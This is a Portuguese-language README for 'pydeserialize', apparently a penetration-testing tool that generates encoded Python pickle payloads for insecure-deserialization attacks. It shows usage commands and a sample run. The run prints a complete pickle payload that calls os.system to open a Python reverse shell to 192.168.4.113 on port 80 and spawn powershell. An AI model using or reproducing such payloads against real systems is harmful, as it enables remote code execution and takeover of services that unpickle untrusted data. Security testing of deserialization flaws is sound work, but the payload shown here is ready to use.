<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>

[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=pydeserialize)](https://git.io/typing-svg)



<h4 align="center">pydeserialize testar vulnerabilidades de desserialização insegura do python</h4>


<p align="center">
  <a href="#características">Características</a> •
  <a href="#instalação">Instalação</a> •
  <a href="#forma-de-utilização"> Forma de utilização</a> •
  <a href="#detalhes">Detalhes</a> •
  <a href="#executando-revmap">Executando revmap</a>  
</p>

---


O pydeserialize é uma ferramenta que gera payloads de desserialização insegura em python. Possui uma funcionalidade que faz encode das payloads desejadas e dessa forma sendo simples e otimizada para velocidade. pydeserialize é construído para fazer apenas uma coisa - gera payloads de desserialização insegura + encodes e faz isso muito bem.

Projetei o `pydeserialize` para cumprir todas as responsabilidades para gera payloads e encodes, mantive um modelo consistentemente passivo para torná-lo útil para testadores de penetração.

# Características

 - Gera payloads para explora vulnerabilidades de desserialização insegura em python    

# Forma de utilização

```sh
pydeserialize -ip 192.168.4.113 -p 80 -e shell -o Windows
pydeserialize -ip 192.168.4.113 -e b64 -p 80 -o Linux
```

# Detalhes 
```yaml
           _                 _     _ _         
 ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ 
| . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
|  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
|_| |___|  
     v0.1.0 - @joaoviictorti

options:
  -h, --help            show this help message and exit
  -ip IP                Insert ip
  -p PORT               Insert port
  -e {b64,shell,urlencode,hex} Insert encoding
  -o {Windows,Linux}    Insert operational system
```

# Instalação

pydeserialize requer **python3** e para baixá-lo só usar:

```sh
pip3 install pydeserialize
```

# Executando pydeserialize

```console
pydeserialize -ip 192.168.4.113 -p 80 -o Windows -e shell

           _                 _     _ _         
 ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ 
| . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
|  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
|_| |___|  
     v0.1.0 - @joaoviictorti

b'\x80\x04\x95\xf9\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\xe1python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.4.113",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("powershell")\'\x94\x85\x94R\x94.'
```

<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>